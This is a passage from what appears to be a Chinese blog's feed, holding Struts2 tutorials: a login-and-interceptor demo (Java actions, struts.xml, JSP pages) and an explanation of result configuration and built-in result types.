class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">"4.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 首页 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>main.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>新建User类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea.domain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String username; <span class="comment">// 用户名</span></span><br><span class="line">    <span class="keyword">private</span> String password; <span class="comment">// 密码</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPassword</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPassword</span><span class="params">(String password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新建LoginAction类，用于处理登录逻辑：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mi1k7ea.domain.User;</span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionContext;</span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ModelDriven;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> <span class="keyword">implements</span> <span class="title">ModelDriven</span>&lt;<span class="title">User</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">8493698886438630994L</span>;</span><br><span class="line">    <span class="keyword">private</span> User user = <span class="keyword">new</span> User();</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">getModel</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 获取ActionContext</span></span><br><span class="line">        ActionContext actionContext = ActionContext.getContext();</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">"admin"</span>.equals(user.getUsername())</span><br><span class="line">                &amp;&amp; <span class="string">"123456"</span>.equals(user.getPassword())) &#123;</span><br><span class="line">            <span class="comment">// 将用户存储在session中</span></span><br><span class="line">            actionContext.getSession().put(<span class="string">"user"</span>, user);</span><br><span class="line">            <span class="keyword">return</span> SUCCESS;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            actionContext.put(<span class="string">"msg"</span>, <span class="string">"用户名或密码错误，请重新登录!"</span>);</span><br><span class="line">            <span class="keyword">return</span> INPUT;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新建BookAction类，商品处理类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BookAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">5640989517690867879L</span>;</span><br><span class="line">    <span class="comment">// 购买图书</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">buy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新建拦截器PrivilegeInterceptor类，继承AbstractInterceptor类，在intercept()函数中通过获取session中是否含有user来判断是否已登录再决定是否放行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea.interceptor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.Action;</span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionContext;</span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionInvocation;</span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.interceptor.AbstractInterceptor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PrivilegeInterceptor</span> <span class="keyword">extends</span> <span class="title">AbstractInterceptor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">193664972753450682L</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">intercept</span><span class="params">(ActionInvocation invocation)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 得到 ActionContext</span></span><br><span class="line">        ActionContext actionContext = invocation.getInvocationContext();</span><br><span class="line">        <span class="comment">// 获取User对象</span></span><br><span class="line">        Object user = actionContext.getSession().get(<span class="string">"user"</span>);</span><br><span class="line">        <span class="keyword">if</span> (user != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> invocation.invoke(); <span class="comment">// 继续向下执行</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            actionContext.put(<span class="string">"msg"</span>, <span class="string">"您还未登录，请先登录！"</span>);</span><br><span class="line">            <span class="keyword">return</span> Action.LOGIN; <span class="comment">// 如果用户不存在，则返回login值</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置struts.xml文件，此文件用于声明自定义拦截器、拦截器栈以及对book操作的Action：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE struts PUBLIC</span></span><br><span class="line"><span class="meta">        "-//Apache Software Foundation//DTD Struts Configuration 2.3//EN"</span></span><br><span class="line"><span class="meta">        "http://struts.apache.org/dtds/struts-2.3.dtd"&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"struts2"</span> <span class="attr">namespace</span>=<span class="string">"/"</span> <span class="attr">extends</span>=<span class="string">"struts-default"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 声明拦截器 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interceptors</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor</span> <span class="attr">name</span>=<span class="string">"privilege"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.interceptor.PrivilegeInterceptor"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-stack</span> <span class="attr">name</span>=<span class="string">"myStack"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">"defaultStack"</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">"privilege"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">interceptor-stack</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">interceptors</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 用户登录操作 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"login"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.action.LoginAction"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span>&gt;</span>/main.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"input"</span>&gt;</span>/login.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 关于book操作 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"book_*"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.action.BookAction"</span> <span class="attr">method</span>=<span class="string">"&#123;1&#125;"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span>&gt;</span>/success.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"login"</span>&gt;</span>/login.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 在action中使用自定义拦截器 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">"myStack"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure><p>新建main.jsp：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=utf-8"</span></span><br><span class="line">         pageEncoding=<span class="string">"utf-8"</span>%&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;主页&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;table border=<span class="string">"0"</span>&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;《SSH框架整合实战教程》&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;&lt;a href="/st2test/book_buy"&gt;购买&lt;/a&gt;&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>新建login.jsp：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=utf-8"</span></span><br><span class="line">         pageEncoding=<span class="string">"utf-8"</span>%&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;登录&lt;/title&gt;</span><br><span class="line">    &lt;style type=<span class="string">"text/css"</span>&gt;</span><br><span class="line">        input[type=text],input[type=password]&#123;width:<span class="number">150</span>px&#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div align=<span class="string">"center"</span>&gt;</span><br><span class="line">    &lt;form action=<span class="string">"/st2test/login.action"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">        &lt;table&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td&gt;&lt;label style="text-align:right;"&gt;用戶名：&lt;/label&gt;&lt;/td&gt;</span><br><span class="line">                &lt;td&gt;&lt;input type="text" name="username"&gt;&lt;/td&gt;</span><br><span class="line">                &lt;td&gt;&lt;span style="color:#F00"&gt;$&#123;requestScope.msg &#125;&lt;/span&gt;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td&gt;&lt;label style="text-align:right;"&gt;密&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;码：&lt;/label&gt;&lt;/td&gt;</span><br><span class="line">                &lt;td&gt;&lt;input type="password" name="password"&gt;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td align="right" colspan="2"&gt;&lt;input type="submit" value="登录"&gt;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">        &lt;/table&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>新建success.jsp：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=utf-8"</span></span><br><span class="line">         pageEncoding=<span class="string">"utf-8"</span>%&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;成功页面&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">尊敬的会员$&#123;user.username &#125;，您已成功购买商品，祝您购物愉快！</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="/2020/05/01/Struts2基础篇之Interceptor（拦截器）/1.png" alt=""></p><p><img src="/2020/05/01/Struts2基础篇之Interceptor（拦截器）/2.png" alt=""></p><p><img src="/2020/05/01/Struts2基础篇之Interceptor（拦截器）/3.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
      <category term="Struts2" scheme="https://www.mi1k7ea.com/categories/Java/Struts2/"/>
    
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="Struts2" scheme="https://www.mi1k7ea.com/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>Struts2基础篇之ResultType（结果类型）</title>
    <link href="https://www.mi1k7ea.com/2020/05/01/Struts2%E5%9F%BA%E7%A1%80%E7%AF%87%E4%B9%8BResultType%EF%BC%88%E7%BB%93%E6%9E%9C%E7%B1%BB%E5%9E%8B%EF%BC%89/"/>
    <id>https://www.mi1k7ea.com/2020/05/01/Struts2基础篇之ResultType（结果类型）/</id>
    <published>2020-04-30T16:00:02.000Z</published>
    <updated>2020-08-15T06:40:23.530Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-参考"><a href="#0x00-参考" class="headerlink" title="0x00 参考"></a>0x00 参考</h2><p>本笔记直接参考或引自如下链接文章：</p><p><a href="http://c.biancheng.net/struts2/" target="_blank" rel="noopener">http://c.biancheng.net/struts2/</a></p><p><a href="https://www.w3cschool.cn/struts_2/" target="_blank" rel="noopener">https://www.w3cschool.cn/struts_2/</a></p><h2 id="0x01-ResultType简介"><a href="#0x01-ResultType简介" class="headerlink" title="0x01 ResultType简介"></a>0x01 ResultType简介</h2><p>ResultType即结果类型。</p><p><code>&lt;results&gt;</code>标签在Struts2 MVC框架中扮演视图的角色。Action负责执行业务逻辑，下一步就是使用<code>&lt;results&gt;</code>标签显示视图。</p><p>Struts提供了许多预定义的结果类型，我们已经看到的是默认的结果类型dispatcher，它用于分发到JSP页面。Struts2允许你使用其他标记语言为视图技术呈现结果，较常选用的包括Velocity，Freemaker，XSLT和Tiles。</p><h2 id="0x02-配置Result"><a href="#0x02-配置Result" class="headerlink" title="0x02 配置Result"></a>0x02 配置Result</h2><p>在 struts.xml 文件中，<code>&lt;result&gt;</code> 元素用于配置 Result 逻辑视图与物理视图之间的映射关系，它有两个可选属性 name 和 type。其中，name 属性用于指定逻辑视图的名称，默认值为 success；type 属性用于指定返回的视图资源的类型，不同的类型代表不同的结果输出，它的默认值是 dispatcher。</p><p>struts.xml 文件中的 <code>&lt;result&gt;</code> 元素配置示例代码如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"loginAction"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.LoginAction"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"success"</span> <span class="attr">type</span>=<span class="string">"dispatcher"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"location"</span>&gt;</span>/success.jsp<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上述代码为 Action 配置了一个 name 为 success 的 Result 映射，该映射的值可以是 JSP 页面，也可以是一个 Action 的 name 值；这里使用 param 子元素为其指定了 Result 映射对应的物理视图资源为 success.jsp。</p><p><code>&lt;param&gt;</code> 子元素的 name 属性有两个值，分别如下：</p><ul><li>location：指定该逻辑视图所对应的实际视图资源。</li><li>parse：指定在逻辑视图资源名称中是否可以使用 OGNL（对象图导航语言）表达式。默认值为 true，表示可以使用，如果设为 false，则表示不支持。</li></ul><p>其实，上述配置代码还可以简化为如下形式：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"loginAction"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.LoginAction"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span>&gt;</span>/success.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br></pre></td></tr></table></figure><p>需要注意的是，在 Result 配置中指定实际资源位置时，可以使用绝对路径，也可以使用相对路径。</p><ul><li>绝对路径以斜杠“/”开头，例如<code>&lt;result&gt;/success.jsp&lt;/result&gt;</code>，相当于当前 Web 应用程序的上下文路径。</li><li>相对路径不以斜杠“/”开头，例如 <code>&lt;result&gt;success.jsp&lt;/result&gt;</code>，相当于当前执行的 Action 路径。</li></ul><h2 id="0x03-预定义的ResultType"><a href="#0x03-预定义的ResultType" class="headerlink" title="0x03 预定义的ResultType"></a>0x03 预定义的ResultType</h2><p>在使用 Struts2 框架编写项目时，当框架调用 Action 对请求进行处理后，就要向用户呈现一个结果视图。在 Struts2 中，预定义了多种 ResultType（结果类型）展示结果视图。</p><p>一个结果类型就是实现了 com.opensymphony.xwork2.Result 接口的类，Struts2 把内置的 <code>&lt;result-type&gt;</code> 都放在 struts-default 包中，struts-default 包就是配置包的父包，这个包定义在 struts2-core-2.3.24.jar 包的根目录下的 struts-default.xml 文件中，在该文件中可以找到相关的 <code>&lt;result-type&gt;</code> 的定义，其代码如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">result-types</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result-type</span> <span class="attr">name</span>=<span class="string">"chain"</span> <span class="attr">class</span>=<span class="string">"com.opensymphony.xwork2.ActionChainResult"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result-type</span> <span class="attr">name</span>=<span class="string">"dispatcher"</span> <span class="attr">class</span>=<span class="string">"org.apache.struts2.dispatcher.ServletDispatcherResult"</span> <span class="attr">default</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result-type</span> <span class="attr">name</span>=<span class="string">"freemarker"</span> <span class="attr">class</span>=<span class="string">"org.apache.struts2.views.freemarker.FreemarkerResult"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result-type</span> <span class="attr">name</span>=<span class="string">"httpheader"</span> <span class="attr">class</span>=<span class="string">"org.apache.struts2.dispatcher.HttpHeaderResult"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result-type</span> <span class="attr">name</span>=<span class="string">"redirect"</span> <span class="attr">class</span>=<span class="string">"org.apache.struts2.dispatcher.ServletRedirectResult"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result-type</span> <span class="attr">name</span>=<span class="string">"redirectAction"</span> <span class="attr">class</span>=<span class="string">"org.apache.struts2.dispatcher.ServletActionRedirectResult"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result-type</span> <span class="attr">name</span>=<span class="string">"stream"</span> <span class="attr">class</span>=<span class="string">"org.apache.struts2.dispatcher.StreamResult"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result-type</span> <span class="attr">name</span>=<span class="string">"velocity"</span> <span class="attr">class</span>=<span class="string">"org.apache.struts2.dispatcher.VelocityResult"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result-type</span> <span class="attr">name</span>=<span class="string">"xslt"</span> <span class="attr">class</span>=<span class="string">"org.apache.struts2.views.xslt.XSLTResult"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result-type</span> <span class="attr">name</span>=<span class="string">"plainText"</span> <span class="attr">class</span>=<span 